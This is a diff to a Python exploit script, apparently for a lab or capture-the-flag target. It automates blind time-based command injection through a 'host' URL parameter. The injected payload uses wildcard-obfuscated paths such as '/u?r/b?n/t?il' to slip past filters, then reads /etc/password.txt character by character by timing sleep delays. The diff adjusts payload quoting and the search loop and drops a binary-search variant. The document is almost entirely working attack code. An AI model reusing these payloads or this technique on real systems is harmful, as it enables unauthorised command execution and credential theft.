@@ -5,6 +5,7 @@ import argparse
 from os import sys
 from typing import Dict
 from urllib3.util import SKIP_HEADER
+from urllib.parse import quote
 from collections import OrderedDict
 from copy import deepcopy
 
@@ -70,78 +71,31 @@ def determine_password_request(url:str,
                                char_code:int, 
                                sleep:int,
                                operator:str):    
-    #COMMAND '/u?r/b?n/t?il -c +'+str(len)+' /etc/password.txt | /u?r/b?n/h?ad -c 1 | { read v; [[ "$v" == "'+chr(char_code)+'" ]] && /u?r/b?n/sl??p '+str(sleep)+'; }'
-    url = deepcopy(url) + '?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Ft%3Fil+-c+%2B'+str(len)+'+%2Fetc%2Fpassword.txt+|+%2Fu%3Fr%2Fb%3Fn%2Fh%3Fad+-c+1+|+{+read+v%3B+[[+"%24v"+%3D%3D+"'+chr(char_code)+'"+]]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+'+str(sleep)+'%3B+}'
-    
-    print(f"Attempting to see if ascii-code={char_code} is '{operator}' than the unknown character at position {len}")
+    #COMMAND '/u?r/b?n/t?il -c +'+str(len)+' /etc/password.txt | /u?r/b?n/h?ad -c 1 | { read v; [ $v = "'+chr(char_code)+'" ] && /u?r/b?n/sl??p '+str(sleep)+'; }'
+    url = deepcopy(url) + '?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Ft%3Fil+-c+%2B'+str(len)+'+%2Fetc%2Fpassword.txt+|+%2Fu%3Fr%2Fb%3Fn%2Fh%3Fad+-c+1+|+{+read+v%3B+[+%24v+%3D+"'+quote(chr(char_code), safe='')+'"+]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+'+str(sleep)+'%3B+}'
+    print(f"Attempting to see if ascii-code={char_code} ({chr(char_code)}) is '{operator}' than the unknown character at position {len}")
     return make_get_request(url, timeout)
 
 
 def linear_search_determine_password(url:str, password_len:int, timeout=10):
     sleep:int = timeout + 1
     password:str = ""
-    for len in range(1, password_len + 1):
-        for char_code in range(35, 126):
+    for len in range(1, password_len):
+
+        found_for_len = False
+
+        for char_code in range(48, 126):
             if determine_password_request(url, timeout, len, char_code, sleep, "="):
                 print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
                 password += chr(char_code)
+                found_for_len = True
                 print("PASSWORD: " + password)
                 break
-        return "NOT FOUND"
+
+        if found_for_len == False:
+            return "NOT FOUND"
+
     return password
-
-
-
-
-def binary_search_determine_password(url:str, password_len:int, timeout:int=10):
-    
-    def binary_search_determine_character(url:str, len:int, timeout=10):
-        
-        print(f"Starting binary search for postion {len}")
-        low = 33
-        high = 126
-        mid = 0
-        sleep = timeout + 1
-    
-        while low <= high:
-    
-            mid = (high + low) // 2
-    
-            if determine_password_request(url=url, 
-                                        timeout=timeout, 
-                                        len=len, 
-                                        char_code=mid, 
-                                        sleep=sleep,
-                                        operator=">"):
-                low = mid + 1
-    
-            elif determine_password_request(url=url, 
-                                        timeout=timeout, 
-                                        len=len, 
-                                        char_code=mid, 
-                                        sleep=sleep,
-                                        operator="<"):
-                high = mid - 1
-    
-            else:
-                return mid
-        
-        return None
-    
-    password = ""
-    for len in range(1, password_len + 1):
-        char_code = binary_search_determine_character(url, len, timeout)
-        
-        if char_code is None:
-            print("FAILED TO FIND PASSWORD")
-            return None
-        
-        print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
-        password += chr(char_code)
-        print("PASSWORD: " + password)
-    return password
-
-
 
 url:str = parse_args()
 timeout = 5
